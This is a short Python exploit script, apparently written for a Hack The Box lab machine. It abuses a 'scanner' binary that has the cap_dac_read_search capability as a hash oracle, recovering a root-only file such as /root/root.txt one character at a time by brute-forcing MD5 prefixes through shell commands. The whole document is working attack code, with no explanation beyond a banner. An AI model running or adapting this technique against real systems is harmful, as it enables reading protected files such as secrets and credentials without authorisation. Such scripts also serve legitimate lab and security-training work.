import hashlib
import string
import subprocess

# CHANGE THIS TO WHAT YOU NEED
filename = "/root/root.txt"

bytes_number = 1
extracted_data = ""

def start_up():
    print("-"*103)
    print("Util Script Created By \"ret2zied\",\nThat Utilize the a binary called 'scanner' inside intentions by HTB.\nWhich has cap_dac_read_search capability exploited to get arbitrary read to anyfile inside the machine.")
    print("-"*103)
    print("Target File to Extract : ", filename)
    print("-"*103)


def find_char(extracted):
    is_found = False
    found_char = ""
    for char in string.printable:
        char_hash = hashlib.md5(extracted.encode() + char.encode()).hexdigest()
        command = f"/opt/scanner/scanner -c {filename} -s {char_hash} -l {bytes_number}"
        res = subprocess.run(command, shell=True, capture_output=True, text=True)
        if res.stdout.strip().__contains__("[+]"):
            is_found = True
            found_char = char
        elif res.stderr.strip() != "":
            print(f"Error {res.stderr.strip()}")
            break
    if is_found:
        return found_char
    else:
        return None

if __name__ == "__main__":
    start_up()
    while 1:
        byte =  find_char(extracted_data)
        if byte != None:
            extracted_data += byte
            bytes_number+=1
        else:
            break
    print("EXTRACTED DATA:\n" + extracted_data)
    